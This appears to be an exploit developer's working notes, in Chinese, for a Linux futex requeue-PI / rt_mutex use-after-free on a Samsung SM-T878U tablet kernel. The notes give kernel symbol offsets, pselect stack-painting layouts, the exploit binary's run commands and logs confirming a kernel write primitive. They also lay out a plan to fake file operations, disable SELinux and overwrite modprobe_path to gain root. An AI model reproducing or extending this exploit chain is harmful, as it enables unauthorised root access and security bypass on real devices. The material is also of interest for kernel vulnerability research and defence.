* `pid = uval & FUTEX_TID_MASK` 必须非 0（`if (!pid) return -EAGAIN`）⇒ **拿不到 PID 0 / `init_task`**；
* `find_get_task_by_vpid(pid)` 必须成功 ⇒ 必须是活的、同 pid namespace 的用户态 task；
* `p->flags & PF_KTHREAD` 必须为假（否则 `-EPERM`）；`PF_EXITING` 必须为假；
* `list_add(&pi_state->list, &p->pi_state_list)` 要写真实 task 的字段。
⇒ 用**专用 helper 线程**（本项目已加 `helper_thread`）：它只 `usleep` 自旋，
   **永不阻塞在任何 PI futex 上**——因为 724 会把 `&W_waiter->pi_tree_entry`（W 的内核栈地址）
   永久留在它的 `p->pi_waiters` 里；一旦它再阻塞在 PI 锁上就会走 `rb_erase` 踩这块栈。

### B4（**结论：按当前设计不可行；§8 第 1、2 项据此关闭**）

想把 `put_pi_state()` 逼到 `kfree` 分支，需要 `current->pi_state_cache != NULL`。
`attach_to_pi_state` 路径**确实可达**（futex.c:1393-1395，`futex_lock_pi_atomic` 内）：
```c
	top_waiter = futex_top_waiter(hb, key);     /* 这里是 hb2/key2 = f_pi_target */
	if (top_waiter) return attach_to_pi_state(uaddr, uval, top_waiter->pi_state, ps);
```
只要 requeue **之前** `f_pi_target` 上已经排了一个 waiter X（`futex_top_waiter(hb2,key2) != NULL`），
就会走 `attach_to_pi_state`（**不调用 `alloc_pi_state`**），于是 `futex.c:1969`
`refill_pi_state_cache()` 那块会留在 R 的缓存里。

**但 refcount 归不了零。** 此时 `pi_state` 是 X 的 `P_X`（refcount = 1，由 X 持有）；
requeue 路径的增减是：
```
attach_to_pi_state: get_pi_state(P_X)                         +1  -> 2
循环:               get_pi_state(P_X)                         +1  -> 3
循环:               rt_mutex_start_proxy_lock 失败 -> put_pi_state(P_X)  -1 -> 2
尾部:               put_pi_state(pi_state)                    -1  -> 1   ← 仍是 X 那一份
```
⇒ `put_pi_state` 在 852 行 `if (!atomic_dec_and_test(&pi_state->refcount)) return;` 就返回了，
**根本走不到 873 的分支**。要让 X 放手（拿锁 / 退出 / `unqueue_me_pi`）会引入新竞态。
**结论：B4 暂缓；先用 B1 + 修正 3 把 `p->pi_waiters` 的受控污染做出来。**

### 步骤 C（后续，仓库已有）
`fake_fops` 安装 → `kernel_read64` / `kernel_write_data` → 关闭 SELinux / 改 `modprobe_path` → root。
当前卡在 `reason=selinux_write ret=-1 errno=22 EINVAL`（`fops.c:3157`）。

---

## 7. 常量与可观测量

### 7.1 符号（`_stext = 0xffffff8008080800`）

| 符号 | 绝对地址 | 相对 `_stext` |
|---|---|---|
| `_stext` | `0xffffff8008080800` | `0x0` |
| `init_task` | `0xffffff800b22d980` | `0x31AD180` |
| `modprobe_path` | `0xffffff800b23be90` | `0x31BB690` |
| `sysctl_nr_open` | `0xffffff800b21f1e0` | `0x319E9E0` |
| `kptr_restrict` | `0xffffff800b22d238` | `0x31ACA38` |
| `init_cred` | `0xffffff800a9ad0d0` | `0x292C8D0` |
| `rt_mutex_adjust_pi` | `0xffffff8008147bac` | `0xC73AC` |
| `rt_mutex_adjust_prio_chain` | `0xffffff8008147c64` | `0xC7464` |
| `remove_waiter` | `0xffffff8008148d74` | `0xC8574` |
| `task_blocks_on_rt_mutex` | `0xffffff8008148994` | `0xC8194` |
| `try_to_take_rt_mutex` | `0xffffff800814877c` | `0xC7F7C` |
| `__rt_mutex_init` | `0xffffff800814869c` | `0xC7E9C` |
| `rt_mutex_next_owner` | `0xffffff8008148fac` | `0xC87AC` |
| `futex_requeue` | `0xffffff800818f824` | `0x10F024` |
| `_raw_spin_trylock` | `0xffffff8009c1958c` | `0x1B98D8C` |
| `core_sys_select` | `0xffffff80082e85a4` | `0x2687A4` |
| `do_select` | `0xffffff80082e89cc` | `0x268BCC` |

（`_stext` 泄漏由 `slide.c` 的 `slide_leak_kernel_base()` / `slide_child_leak_stext()` 提供。）

### 7.2 观测手段（都已实测可用，**零重启**）

* **`/proc/slabinfo` 以 `uid=2000(shell)` 可读** ⇒ 可观测 kmalloc-96 的 `active_objs`/`num_objs`。
  * 注意：`kmalloc-96` 已被 **SLUB 合并**，在 `/proc/slabinfo` 里不以 `kmalloc-96` 出现；
    `/sys/kernel/slab/:0000096` 存在但目录内文件 `Permission denied`。
    96 字节且未合并的只有 `f2fs_extent_tree` 与 `configfs_dir_cache`。
  * 因此 slab 计数只能作**粗粒度**佐证。
* **`/proc/<tid>/stat` 第 18 字段 = `task_prio()` = `task->prio - 100`**（动态优先级，含 PI 提升；
  `fs/proc/array.c:522` `priority = task_prio(task)`，`:547` 打印）。实测校准：
  nice-0 任务读到 **20**，nice-19 任务读到 **39**（= `static_prio 139 - 100`）。
  ⚠️ **必须配合 §6 修正 4 的 `min()` 约束使用**：`rt_mutex_setprio(p, W)` 只能提升 p 的优先级，
  所以只有 `nice(W) < nice(p)` 时第 18 字段才会变化。第 19 字段是 `task_nice()`（静态），
  用它验证 `setpriority()` 是否生效。
* **consumer 线程是否返回**：回收未命中 ⇒ 585 的 trylock 失败 ⇒ 在 `retry:` 自旋
  （会 `raw_spin_unlock_irq(&task->pi_lock)`，可抢占），表现为该线程 100% CPU 卡在内核态，而**不是立刻 panic**。
* 崩溃时的 KP dump：`/data/log/kpd_*.zip`（世界可读，**立刻拉取**，只保留最近几个）。

---

## 8. 待办 / 未核实

1. ✔ **已关闭（结论：不可行）** —— `attach_to_pi_state()` 的前置条件已逐行核实（futex.c:1055-1135）：
   可达条件 = `futex_top_waiter(hb2, key2)` 在 `f_pi_target` 上非空（futex.c:1393-1395）。
   但 requeue 路径下 refcount 不归零（见 §6 B4），所以 B4 拿不到 `kfree`。
2. ✔ **已关闭** —— refcount 精确计数已算出：`attach(+1) + loop(+1) - loop_break(-1) - tail(-1) = 0`
   相对 X 的引用，故停在 1。见 §6 B4 的算式。
3. ✔ 已关闭：`handle_early_requeue_pi_wakeup()`（futex.c:3160）只在 requeue **之前**被超时/信号
   唤醒时才有动作；W 一直阻塞时是空操作。
4. ✔ 已关闭：`rt_mutex_adjust_pi()` 的前置 `if (pi)` 成立（dump 825 的调用栈已证明）。
5. **B1 的实测验证**：`/proc/<helper_tid>/stat` 第 18 字段是否按 §6 修正 4 的三段值变化
   （`39 → 25 → 21`）。这同时证明 B1 复用缓存 chunk（`mid`）与链走到达 725（`post`）。
   * 若 `mid` 不变成 25：B1 没取到那块 chunk（可能 `f_rearm` 的字没设对，或 R 不是 requeue 者）。
   * 若 `mid == 25` 但 `post != 21`：说明 716 判据（`W->prio < R->prio`）没满足，
     链走只走到 742 的 `else` 空分支。
6. 选一个满足「`*(T)&1 == 1` 且 `*(T+0x08)` 或 `*(T+0x10)` 为 0」的写目标（用于 `685` 的两级下降），
   这是把 `rt_mutex_enqueue` 的写入原语变成**可控地址写**的关键。
7. **把 `p->pi_waiters` 里的残余节点变成任意写**：需要一次 `rb_erase`，且该节点的
   `__rb_parent_color`/`rb_right`/`rb_left` 要受控。该节点位于 `W_waiter + 0x18`
   （= `SP0-0x178`），其三个字段落在 `SP0-0x178 / 0x170 / 0x168`。
   **⚠️ 这三个位置与 `waiter->lock`（`SP0-0x158`）一样全部落在 `fds.res_*`（输出集）**，
   所以 §5 的否证同样适用于它们 —— 控制它们需要另一条栈涂原语，见第 8 项。
8. **找一条把用户数据放到 `[SP0-0x190, SP0-0x148)` 的栈涂原语**。
   `pselect6`/`select` 的 `stack_fds` 布局（`SP0-0x210`，6×40B）使
   `waiter` 的**全部有效字段**都落在 `res_in/res_out/res_ex`：见下表。
   `do_sys_poll` 的 `stack_pps` 只有 256B 且位于帧底（`SP0-0x400`），够不到 `SP0-0x190`。
   ⇒ 需要一个「用户缓冲区落在 `SP0-0x190` 附近、且该 syscall **不需要任何 fd 就绪**」的原语。

   | waiter 字段 | 偏移 | pselect6 全局字 | 落在哪个集 |
   |---|---|---|---|
   | `tree_entry.__rb_parent_color` | `SP0-0x190` | 16 | `res_in[1]` |
   | `tree_entry.rb_right` | `SP0-0x188` | 17 | `res_in[2]` |
   | `tree_entry.rb_left` | `SP0-0x180` | 18 | `res_in[3]` |
   | `pi_tree_entry.__rb_parent_color` | `SP0-0x178` | 19 | `res_in[4]` |
   | `pi_tree_entry.rb_right` | `SP0-0x170` | 20 | `res_out[0]` |
   | `pi_tree_entry.rb_left` | `SP0-0x168` | 21 | `res_out[1]` |
   | `task` | `SP0-0x160` | 22 | `res_out[2]` |
   | `lock` | `SP0-0x158` | 23 | `res_out[3]` |
   | `prio` | `SP0-0x150` | 24 | `res_out[4]` |
   | `deadline` | `SP0-0x148` | 25 | `res_ex[0]` |

   用户**直接可写**的只有全局字 `[0, 3*5) = [0,15)`（`fds.in/out/ex`），最大到 `SP0-0x198`；
   想让输入集覆盖字 23 需要 `3*wps > 23` ⇒ `wps ≥ 8` ⇒ `size ≥ 64` ⇒ `6×64 = 384 > 256` ⇒ `kvmalloc` ⇒ 堆，不叠栈。

   **⇒ 「输入集涂」关闭，但「`res_*` 就绪位图涂」可行**（见 §5.2 实测）：
   `res_*` 的值 = 就绪 fd 的位图，可逐位构造。所以 §8 第 8 项的答案不是「另找原语」，
   而是**把 `res_*` 的就绪位图当成可编程的 8 字节写通道**——代价是 select 必须返回，
   因而对 `do_notify_resume` 的帧覆盖敏感（§5.2 末尾的脆弱性）。

---

## 9. 与上一轮文档的关系

`docs/PSELECT_GEOMETRY_FINDINGS.md` §9.8/§9.9 的“零重启 oracle 通过”结论仍然有效。

**关于「链走在哪里退出」必须区分两次完全不同的链走**（这是本文最容易读混的地方）：

| | 谁触发 | 参数 | 退出点 | 后果 |
|---|---|---|---|---|
| **链走 α** | `task_blocks_on_rt_mutex`（在 requeue 的 `rt_mutex_start_proxy_lock` 里） | `rt_mutex_adjust_prio_chain(M, **FULL**, &P->pi_mutex, &pi_mutex_chain, W_waiter, **W**)` | **`rtmutex.c:600`** —— `rt_mutex_owner(&pi_mutex_chain) == W == top_task` ⇒ **`-EDEADLK`** | `remove_waiter()` 被调用 ⇒ **UAF 成立** |
| **链走 β** | `rt_mutex_adjust_pi(W)`（在 consumer 的 `sched_setattr` 里） | `rt_mutex_adjust_prio_chain(W, **MIN**, NULL, &P->pi_mutex, NULL, W)` | **`rtmutex.c:698`** —— `pi_mutex.owner == 0`（`put_pi_state` 的 `rt_mutex_proxy_unlock` 写的） | 干净 `return 0`（并 wake W）⇒ **零重启 oracle 存活** |

* 上一轮把「α 命中 600」当成存活原因；本文 §0 第 3 行/§3 把它更正为「**β** 命中 698」。
  两者都对，只是**不同的链走**。`run_hold_oracle()` 的注释写的是 α，本文 §2 写的是 β。
* α 能命中 600 的**充要条件**（本轮逐门核实，见 §1）：M 在 requeue 那一刻**自己阻塞在某个锁上**，
  且那个锁的 owner 是 W。本仓库正是 `owner_thread` 阻塞在 W 持有的 `f_pi_chain` 上
  （`main.c` 的 `FUTEX_LOCK_PI(&f_pi_chain)`），所以 `-EDEADLK` 必然出现 ⇒ `errno=35` 是可靠判据。

§9.9 提出的“`owner` 超时 → `FUTEX_UNLOCK_PI` → `pi_state` 被释放”这一步**不成立**：
`put_pi_state()` 走的是 per-task 缓存分支（§2）。替代方案是本文 §6 的 B1（缓存复用）；
B4（强制 `kfree`）已证明在当前 requeue 路径下不可行。

---

## 10. 本轮实测结果（零重启，`scratch/runs/rearm2_20261001_141155.log`）

**命令**：
```sh
IONSTACK_ROUTE_REARM=1 IONSTACK_CONSUMER_NICE=1 IONSTACK_CONSUMER_REAL_NICE=1 \
IONSTACK_HELPER_NICE=19 IONSTACK_R_NICE=5 \
  ./build/smt878u-ionstack-reroot -s <DEVICE-SERIAL> --t878u-pselect-route --force
```
**设备**：`boot_id` 前后均为 `c9d3e4da-ccf6-404b-b181-63897101c879` ⇒ **零重启**。

**新增代码**（本轮）：
* `src/exploit/main.c`：`helper_thread`（B1 的 owner p）、`read_task_stat_field()/read_task_prio()/read_task_state()`、
  `consumer_thread` 的 rearm 分支（含「等 R 连续两次处于 'S'」的地雷 1 守卫）、`run_rearm_oracle()`。
* `src/exploit/common.h`：`f_rearm` 与 7 个新 atomic 的 extern。
* `src/device/ionstack_reroot_device.c`：注册 `IONSTACK_ROUTE_REARM` / `IONSTACK_HELPER_NICE` / `IONSTACK_R_NICE`
  （`spawn_child()` 会清空环境，必须显式登记）。

**结果**：
```
[*] requeue ret=-1 errno=35 hold=0 rearm=1
[+] rearm arming f_rearm word=32613 (helper tid) requeue_tid=26671 helper_nice=19 helper_prio_base=39
[+] rearm-result requeue_tid=26671 waiter_tid=32610 consumer_ret=0 errno=0 helper_tid=32613
    helper_nice=19 prio_base=39 prio_mid=25 prio_post=25 b1_expect=125 walk_expect=121
    b1_rearmed=0 walk_reached_725=0
```

**逐项判读**：

| 观测 | 期望（若机制成立） | 实测 | 判读 |
|---|---|---|---|
| `prio_base` | `139-100 = 39` | **39** ✔ | `/proc` 第 18 字段读取正确（nice-19 ⇒ 39） |
| `prio_mid` | `min(139, R->prio=125)-100 = 25` | **25** ✔ | **B1 成功**：`alloc_pi_state()` 把缓存的 chunk 取回，`rt_mutex_init_proxy_locked(&P->pi_mutex, helper)` 生效，且 `task_blocks_on_rt_mutex` 的 `rt_mutex_adjust_prio(helper)` 把它提升到 R 的优先级 |
| `prio_post` | `min(139, W->prio=121)-100 = 21` | 25 ✘ | 链走**没有**执行到 725 |
| 设备 | 存活 | 存活 ✔ | 地雷 1 守卫有效（R 已 parked ⇒ `prerequeue_top_waiter = Rw ≠ NULL`） |

> 注：`b1_rearmed=0 / walk_reached_725=0` 是**代码里的比较写错了**（把「字段 18 值」与「绝对 prio」
> 直接比）。正确判据是 `mid == b1_expect - 100` 与 `post == walk_expect - 100`。
> 按正确判据：**`b1_rearmed = 1`（25 == 125-100）**，`walk_reached_725 = 0`（25 ≠ 21）。

**为什么 `prio_post` 没到 21 —— 见 §5.3。**
`rt_mutex_adjust_pi(W)` 的早退门 `waiter->prio == W->prio` 在本用例里恒成立（两者都是 120），
所以消费线程的 `sched_setattr` 只是白跑一趟。**要让链走发生，必须先把 `waiter->prio`
（`SP0-0x150`，pselect6 全局字 24 / `res_out[4]`）涂成 ≠ 120** —— 这正是 pselect 路线
`prio=130 / bits=2` 那一步的作用（§5.2/§5.3）。

**因此下一步很明确**：把 `run_rearm_oracle()` 与 pselect 的 **`prio` 单格涂写**串起来
（只需 2 个位，不需要涂 `lock`；`lock` 保持 `&P->pi_mutex` 即可，因为 B1 已让它的 owner 受控）。
这样链走就会在**我们选定的 owner** 上执行 723/724/725，从而拿到 §6 修正 3 的写入原语。

---

## 11. 本轮实测结果（零重启，`scratch/runs/designh_20261001_144916.log`）

### 11.1 结论一句话

**链走已经到达 `rtmutex.c:723/724/725`，写入原语（`rt_mutex_enqueue_pi` /
`rt_mutex_enqueue`）已经在真实内核上跑通了。** 触发方式**不是**信号、**不是**
`sched_setattr`，而是给 `M` 的 `FUTEX_LOCK_PI(&f_pi_chain)` 装一个**绝对超时**。

### 11.2 原始日志（关键行）

```
[+] masks owner-pre-block tid=10565 state=R prio=20 SigBlk=0000000080000000 SigPnd=0 ShdPnd=0 SigIgn=0000002000000000
[*] waiter setpriority nice=1 ret=0 errno=0 (self prio=21)
[+] route boost-gate waiter_tid=10564 waiter_nice=1 first=20 prio=20 want=20 boosted=1
[*] requeue ret=-1 errno=35 hold=1 rearm=1
[+] masks pre-fire-owner  tid=10565 state=S prio=20 SigBlk=0000000080000000 SigPnd=0 ShdPnd=0
[+] masks pre-fire-waiter tid=10564 state=S prio=20 SigBlk=0000000080000000 SigPnd=0 ShdPnd=0
[+] fire none -- relying solely on owner hrtimer timeout
[*] owner chain FUTEX_LOCK_PI ret=-1 errno=110 timeout_ms=2500
[+] rearm-result requeue_tid=2190 waiter_tid=10564 consumer_ret=0 errno=0 helper_tid=10567
    helper_nice=19 prio_base=39 prio_mid=25 prio_post=21 b1_expect=25 w_before=20 w_after=21
    b1_rearmed=1 walk_reached_725=1 deboosted=1 requeue_prio=25
[+] rearm-samples helper=21/21/21/21 waiter=21/21/21/21 fire=none owner_tid=10565
    owner_ret=-1 owner_errno=110 owner_eintr=0 owner_prio=20 owner_done=1 deadline=7338360 now=7338939
[+] rearm-trace[0]  h=25/25/25/25/25/25/25/25 w=20/20/20/20/20/20/20/20 o=20/20/20/20/20/20/20/20
[+] rearm-trace[8]  h=25/25/25/25/25/25/25/21 w=20/20/20/20/20/20/20/21 o=20/20/20/20/20/20/20/20
[+] rearm-trace[16] h=21/21/21/21/21/21/21/21 w=21/21/21/21/21/21/21/21 o=20/20/20/20/20/20/20/20
[+] masks post-fire-owner  tid=10565 state=S prio=20
[+] masks post-fire-waiter tid=10564 state=S prio=21
```

复现命令：

```sh
IONSTACK_ROUTE_REARM=1 IONSTACK_ROUTE_HOLD=1 IONSTACK_REARM_FIRE=none \
IONSTACK_W_NICE=1 IONSTACK_HELPER_NICE=19 IONSTACK_R_NICE=5 \
IONSTACK_OWNER_LOCK_TIMEOUT_MS=2500 \
  ./build/smt878u-ionstack-reroot -s <DEVICE-SERIAL> --t878u-pselect-route --force
```

### 11.3 逐项判读

| 观测 | 期望 | 实测 | 判读 |
|---|---|---|---|
| `owner chain ... errno` | `110 (ETIMEDOUT)` | **110** ✔ | M 的 hrtimer 到期，`__rt_mutex_slowlock()` 走 `timeout && !timeout->task` 分支返回 `-ETIMEDOUT` |
| `remove_waiter(chain, M_waiter)` | 必须被调用 | 由上一行**证明** | `futex_lock_pi()` 的 `if (ret && !rt_mutex_cleanup_proxy_lock(...))` 只在 `ret != 0` 时调用；`cleanup` 里 `rt_mutex_owner(lock) != current` ⇒ `remove_waiter()` 且 `current == M == waiter->task` |
| `w_before` → `w_after` | `20 → 21` | **20 → 21** ✔ | `remove_waiter()` 的 `rt_mutex_adjust_prio(W)` 在 `W->pi_waiters` 清空后把 `W->prio` 从被夹紧的 120 放回 `W->normal_prio = 121` |
| `deboosted` | 1 | **1** ✔ | 去boost成立 |
| `prio_post` | `min(139, 121)-100 = 21` | **21** ✔ | 链走**穿过** `rtmutex.c:569`（`W_waiter->prio=120 ≠ W->prio=121`），到达 723/724/725 |
| `walk_reached_725` | 1 | **1** ✔ | `post == w_after` 自校准判据（725 行 `helper->prio := W->prio`） |
| trace 同步跳变 | `h` 与 `w` 同一次采样跳变 | **trace[8] 第 7 格同时 25→21 / 20→21** ✔ | 这就是 725 行的指纹：`rt_mutex_adjust_prio(helper) -> min(139, W->prio)` |
| 设备 | 不重启 | boot_id `c9d3e4da…` 不变 ✔ | 地雷 1 守卫有效（661 行 `prerequeue_top_waiter = Rw ≠ NULL`，因为 B1 已把 R 的 waiter 挂进 `&P'->pi_mutex`） |

### 11.4 上一轮 `prio_post=20` 之谜已解开

上一轮（`designg2`）看到 `owner_ret=0 owner_errno=0 owner_eintr=0` 并据此推断
「信号没打断 M」。**真正的解释更简单也更糟：`owner chain FUTEX_LOCK_PI` 这一行
在日志里根本不存在 ⇒ M 从未返回，那三个 0 只是 `reset_main_route_state()` 留下的初值。**
所以当时 `prio_post=20` 是「链走根本没跑，而 helper 的 25→20 另有来源」。
本轮换成**确定性 hrtimer 超时**后 M 必然返回，一切就按预测走通了。

信号为什么没唤醒 M 仍未查清，但**不再重要**：`SigBlk` 实测只有 `0x80000000`
（信号 32 = `SIGRTMIN`，从 `adbd`/`init` 继承），**`SIGUSR1` 并未被阻塞**，
所以「掩码阻塞」这条假设也被排除。超时触发严格优于信号：无需投递、有界、且
`owner_block_ms + owner_timeout_ms` 让采样线程可以精确框住它。

### 11.5 本轮纠正的三条旧结论

1. **`futex.c:2036` 的守卫是 TRUE，不是 FALSE。**
   该行是 `if (requeue_pi && (task_count - nr_wake < nr_requeue))`，而 `task_count`
   是**本函数自己的循环计数器**，在 2036 行时还是 **0**（声明于 1939 行，只在
   2058/2133 行自增）。所以 `0 - 1 < 1` ⇒ `-1 < 1` ⇒ **真** ⇒
   `futex_proxy_trylock_atomic()` **会执行**。旧文档写的 `1-1<1=false` 是把它误当成了
   「桶里 waiter 数」。
2. **本内核的 `futex.c` 是 4.14 世代的老变体，不是 4.19 重写版。**
   `attach_to_pi_owner()` 的签名是 `(u32 __user *uaddr, u32 uval, union futex_key *key,
   struct futex_pi_state **ps)` —— **没有 `task` 参数，也没有 `owner == task` 检查**；
   它**无条件** `alloc_pi_state()` + `rt_mutex_init_proxy_locked(&pi_state->pi_mutex, p)`
   （`futex.c:1282/1288`），其中 `p = find_get_task_by_vpid(uval & FUTEX_TID_MASK)`。
   并且 `alloc_pi_state()`（`futex.c:828`）**不分配**，它只
   `WARN_ON(!pi_state); current->pi_state_cache = NULL; return pi_state;`
   —— 也就是说 `refill_pi_state_cache()` 必须先跑过。
3. **`remove_waiter()` 的调用点比之前记的多一个，而且它就是我们要的那个。**
   `rt_mutex_start_proxy_lock()`（`rtmutex.c:1797`）：
   ```c
   raw_spin_lock_irq(&lock->wait_lock);
   ret = __rt_mutex_start_proxy_lock(lock, waiter, task);
   if (unlikely(ret))
           remove_waiter(lock, waiter);      /* current == requeue task R */
   raw_spin_unlock_irq(&lock->wait_lock);
   ```
   `futex_requeue()` 在 `futex.c:2156` 调用的正是这个（不是 `__` 版本），所以
   `-EDEADLK` 必然伴随一次 `current == R != waiter->task` 的 `remove_waiter()`。

### 11.6 新发现：**8 秒保险丝**（必须记住的硬约束）

requeue 失败（`-EDEADLK`）时 `futex_requeue()` 在 `futex.c:2180-2186`
`this->pi_state = NULL; put_pi_state(pi_state); break;`，
**`requeue_futex()` 没跑** ⇒ W 的 `futex_q.key` 仍是 `key1`，`q.pi_state == NULL`，
而 `q.rt_waiter` 仍非空。

于是 W 的 `FUTEX_WAIT_REQUEUE_PI` 一旦返回（超时/信号），
`futex_wait_requeue_pi()` 走 `futex.c:3314` 的 `else` 分支：

```c
WARN_ON(!q.pi_state);                       /* 3341：先 WARN */
pi_mutex = &q.pi_state->pi_mutex;           /* 3342：NULL + 0x10 = 0x10 */
ret = rt_mutex_wait_proxy_lock(pi_mutex, to, &rt_waiter);   /* 3343：解引用 0x10 ⇒ oops */
```

⇒ **从 requeue 成功到 W 的 futex 超时（本仓库 `ROUTE_WAIT_SECONDS = 8`）之间，
就是整个利用窗口。** 超窗后必然 oops（DoS），不会给 root。
这解释了为什么之前几轮的日志都是「跑完 oracle 就被 harness 杀掉」而没有崩：
每次都在 8 秒内收工。**后续设计必须把窗口当成硬预算，或把 `ROUTE_WAIT_SECONDS` 调大。**

### 11.7 下一步

写入原语已经活了，剩下的是**把 `W_waiter->lock` 从 `&P'->pi_mutex` 改成受控指针**：

* `P'` 是 `R->pi_state_cache` 里那块 kmalloc-96（B1 用 `alloc_pi_state()` 取回并
  `rt_mutex_init_proxy_locked(&P'->pi_mutex, helper)`），**不是**可回收页；
  所以 685 行 `rt_mutex_enqueue(&P'->pi_mutex, W_waiter)` 只会写进
  `R` 的内核栈（`Rw->tree_entry.rb_left`），拿不到任意写。
* 两条路：
  1. **pselect 涂栈**（仓库已有全套 `PSELECT_WAITER_WORD_*` / `pselect_put_waiter_word_res_race`，
     实测 `paint_ok=1`）把 `W_waiter->lock` 指向回收页里的 `fake_lock`，
     并把 `->task` / `->prio` 一起涂。**注意**：现在 `prio` 已由去boost自动打破早退门，
     所以只需涂 `lock`（和 `task`），不必再涂 `prio`。
  2. 或让 `W_waiter->lock` 保持 `&P'->pi_mutex`，但把 `P'->pi_mutex.owner`
     设成受控对象 —— 受 `attach_to_pi_owner()` 的 `PF_KTHREAD` 检查限制，
     只能是活着的用户态任务（现在的 `helper` 就是）。
* **只允许一次链走**：第一次（本轮）是安全的，因为 `W_waiter->tree_entry` 处于
  `RB_EMPTY_NODE`（`remove_waiter` 在 requeue 时 `RB_CLEAR_NODE` 过），685 行的
  `rt_mutex_dequeue()` 是空操作。但链走会把 `W_waiter` **真的**挂进
  `&P'->pi_mutex` 的树里，于是第二次链走就会做真正的 `rb_erase`，
  且在 685 行重新入树时会造出 `Rw.rb_left == Rw.rb_right == &W_waiter`
  的**损坏红黑树**。⇒ 必须让**唯一一次**链走就打在涂好的 `fake_lock` 上。

---

## 12. 第 12 轮：推翻「8 秒保险丝」+ 找到真正的自洽约束

本节全部结论都对着
`Kernel_T878USQS8DXE2/kernel/futex.c`、`kernel/locking/rtmutex.c`、
`kernel/locking/rtmutex_common.h` 逐行核对过，标注了行号。

### 12.1 一句话

**§11.6 的「8 秒保险丝」是错的**：requeue 失败后 W 的
`FUTEX_WAIT_REQUEUE_PI` 会**安全返回**，不会解引用 `NULL+0x10`。
真正卡住整条链的不是超时，而是 `rt_mutex_top_waiter()` 里的
`BUG_ON(w->lock != lock)`（`rtmutex_common.h:60`）——这条约束同时
解释了设备端为什么硬性把 `IONSTACK_FOPS_LOCK_OWNER_MODE=none` 夹紧成
`init-task`。

### 12.2 推翻「8 秒保险丝」

§11.6 的推理链是：requeue 失败 ⇒ `requeue_futex()` 没跑 ⇒
`q.key` 仍是 `key1`、`q.pi_state == NULL`、`q.rt_waiter != NULL`
⇒ W 返回时走 `futex.c:3333` 的 `else` 分支 ⇒ `WARN_ON(!q.pi_state)`
⇒ `pi_mutex = &q.pi_state->pi_mutex` = `NULL+0x10` ⇒ oops。

**错在最后一步。** `futex_wait_requeue_pi()` 在
`futex_wait_queue_me()` 之后**先**调用
`handle_early_requeue_pi_wakeup()`，**再**才碰 `q.pi_state`：

```c
/* futex.c:3296-3302 */
	futex_wait_queue_me(hb, &q, to);

	spin_lock(&hb->lock);
	ret = handle_early_requeue_pi_wakeup(hb, &q, &key2, to);
	spin_unlock(&hb->lock);
	if (ret)
		goto out_put_keys;          /* <-- 直接跳出，不碰 q.pi_state */
```

而 `handle_early_requeue_pi_wakeup()`（`futex.c:3160-3190`）是：

```c
	if (!match_futex(&q->key, key2)) {          /* 3173 */
		WARN_ON(q->lock_ptr && (&hb->lock != q->lock_ptr));
		plist_del(&q->list, &hb->chain);
		hb_waiters_dec(hb);
		ret = -EWOULDBLOCK;                     /* 3183 */
		if (timeout && !timeout->task)
			ret = -ETIMEDOUT;
		else if (signal_pending(current))
			ret = -ERESTARTNOINTR;
	}
	return ret;                                 /* 3189 */
```

requeue 失败时 `futex_requeue()` 在 `futex.c:2171-2187`
`this->pi_state = NULL; put_pi_state(pi_state); break;`，
**`requeue_futex()`（2189）没跑**，所以 `this->key` 仍是 `key1`
⇒ `match_futex(&q->key, key2)` 为假 ⇒ `ret != 0` ⇒ `goto out_put_keys`
⇒ `put_futex_key(&q.key)` / `put_futex_key(&key2)` ⇒ **干净返回
`-EWOULDBLOCK` 或 `-ETIMEDOUT`**。

**结论：**
1. **没有 8 秒保险丝。** 8 秒只是 `ROUTE_WAIT_SECONDS` 这个等待预算，
   不是硬约束。之前几轮「跑完 oracle 就被 harness 杀掉」纯粹是 harness
   的等待策略，不是因为再不收工就会崩。
2. **W 返回之后 `W->pi_blocked_on` 依然悬空**（`remove_waiter` 只清了
   `current->pi_blocked_on`，而 `current == R`），早退路径不碰它。
   所以 W 可以**在自己的 stale waiter 槽位上跑 pselect 涂栈**——
   这正是 `main.c:606` 那条 `do_pselect_fake_lock_route()` 的设计前提，
   它并没有被超时堵死。

### 12.3 真正的约束：`rt_mutex_top_waiter()` 的 `BUG_ON(w->lock != lock)`

`kernel/locking/rtmutex_common.h:53-63`：

```c
static inline struct rt_mutex_waiter *
rt_mutex_top_waiter(struct rt_mutex *lock)
{
	struct rb_node *leftmost = rb_first_cached(&lock->waiters);
	struct rt_mutex_waiter *w = NULL;

	if (leftmost) {
		w = rb_entry(leftmost, struct rt_mutex_waiter, tree_entry);
		BUG_ON(w->lock != lock);            /* <== 第 60 行 */
	}
	return w;
}
```

（注意 `rtmutex_common.h` 有两份定义，第二份是
`#else` 分支的 `return NULL` 桩，本内核走第一份。）

调用点（`grep -n rt_mutex_top_waiter kernel/ include/`，共 18 处），
链走里相关的：

| 行 | 代码 | 该行要求 |
|---|---|---|
| 644 | `top_waiter = rt_mutex_top_waiter(lock)` | 下一轮用 |
| 661 | `prerequeue_top_waiter = rt_mutex_top_waiter(lock)` | `rb_leftmost->lock == lock` |
| 704 | `if (prerequeue_top_waiter != rt_mutex_top_waiter(lock))` | 同上 |
| 705 | `wake_up_process(rt_mutex_top_waiter(lock)->task)` | 同上，且 `->task` 可读 |
| 716 | `if (waiter == rt_mutex_top_waiter(lock))` | 同上 |
| 764 | `top_waiter = rt_mutex_top_waiter(lock)` | 同上 |

**这条 `BUG_ON` 是整条链的隐藏自洽约束**，也是设备端那段夹紧的真正原因：

```c
/* src/device/ionstack_reroot_device.c:66-84 */
static const char *effective_t878u_lock_owner_mode(const char *requested) {
  ...
  fprintf(stderr,
          "[reroot] clamp IONSTACK_FOPS_LOCK_OWNER_MODE=none -> init-task "
          "on SM-T878U; ownerless rt_mutex_adjust_prio_chain reaches "
          "rt_mutex_top_waiter(lock) consistency BUGs on this 4.19 tree. "
          "Set IONSTACK_T878U_ALLOW_OWNERLESS_PI=1 to override.\n");
  return "init-task";
}
```

**它反过来是一个极强的正面证据：** 走到 661/704/716 时 `lock` 是
`waiter->lock`（579 行），所以 `BUG_ON(waiter->lock != lock)` 是恒真的。
`BUG_ON` 能触发只有一种可能——**`rb_leftmost` 指到了一个「`lock` 字段
不是这个 `lock`」的节点**。而在本工程里唯一会造出这种节点的，就是
**pselect 把 `W_waiter->lock` 涂成了 `fake_lock`，而链走用的 `lock` 却是
`&P->pi_mutex`（真锁）**：685 行 `rt_mutex_enqueue(&P->pi_mutex, W_waiter)`
把 `W_waiter` 挂进真锁的树，之后任何一次
`rt_mutex_top_waiter(&P->pi_mutex)` 都会看到
`rb_leftmost = &W_waiter->tree_entry` 而 `W_waiter->lock == fake_lock`
⇒ `BUG_ON` 命中。

